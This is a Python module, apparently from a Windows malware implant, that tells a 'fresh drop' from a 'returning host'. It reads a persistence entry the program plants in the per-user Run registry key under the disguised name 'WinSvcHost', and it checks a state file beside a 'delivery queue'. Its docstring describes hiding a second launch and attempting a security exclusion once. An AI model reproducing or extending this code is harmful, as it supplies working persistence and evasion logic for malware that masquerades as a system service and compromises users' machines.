"""How this process got here: a fresh drop, or the machine coming back.

The difference matters three times in one run. A fresh execution has no install
directory to exclude, no previous state to resume, and no reason to hide a second
launch. A returning host is the opposite on all three: the Run value is the proof the
image was installed, the state file is the proof a previous run did not finish, and the
exclusion is only worth attempting once.

The signal is deliberately boring and local — the per-user Run value this build writes
itself, the image path it points at, and the state file beside the delivery queue. No
heuristics, no guesses about the parent process: a value that names this exact file is a
fact, and everything else is a preference.

``boot_id`` is uptime in whole minutes. Two runs in one boot share it, a reboot changes
it. That is enough to tell "the machine restarted and came back" from "the same session
ran twice", and it costs one API call instead of a WMI query.
"""

from __future__ import annotations

from dataclasses import dataclass
from pathlib import Path
from typing import Final

from . import util, winapi

# The Run value key and name this build installs under. Declared here as well as in
# util because the reader must not depend on the writer having run in this process;
# the two are pinned to each other by a test.
RUN_KEY: Final[str] = r"Software\Microsoft\Windows\CurrentVersion\Run"
RUN_NAME: Final[str] = "WinSvcHost"


def boot_id() -> str:
    """Uptime in whole minutes, or ``unknown`` when the API refuses."""
    uptime = winapi.uptime_ms()
    if uptime is None:
        return "unknown"
    return str(uptime // 60_000)


def _installed_path() -> Path | None:
    raw = winapi.registry_value(winapi.HKEY_CURRENT_USER, RUN_KEY, RUN_NAME)
    if not isinstance(raw, str) or not raw.strip():
        return None
    text = raw.strip().strip('"')
    if not text:
        return None
    return Path(text)


def _same_file(left: Path, right: Path) -> bool:
    try:
        return left.resolve() == right.resolve()
    except OSError:
        return str(left).lower() == str(right).lower()


@dataclass(frozen=True, slots=True)
class Context:
    mode: str  # "fresh" | "returning"
    boot_id: str
    image: str
    first_run: bool
    run_index: int
    installed: bool
    staged_path: str
    resumed: bool

    def as_dict(self) -> dict[str, object]:
        return {
            "mode": self.mode,
            "boot_id": self.boot_id,
            "image": self.image,
            "first_run": self.first_run,
            "run_index": self.run_index,
            "installed": self.installed,
            "staged_path": self.staged_path,
            "resumed": self.resumed,
        }


def evaluate(run_index: int = 1, *, resumed: bool = False) -> Context:
    """Classify this launch. Never raises and never blocks on the registry."""
    image = util.executable_path()
    installed = _installed_path()
    installed_here = installed is not None and _same_file(installed, image)

    previous = util.read_json(util.queue_root() / "state.json")
    has_state = isinstance(previous, dict)
    first_run = not (installed_here and has_state)

    return Context(
        mode="returning" if installed_here else "fresh",
        boot_id=boot_id(),
        image=str(image),
        first_run=first_run,
        run_index=run_index,
        installed=installed is not None,
        staged_path=str(installed) if installed is not None else "",
        resumed=resumed,
    )


__all__ = ["RUN_KEY", "RUN_NAME", "Context", "boot_id", "evaluate"]
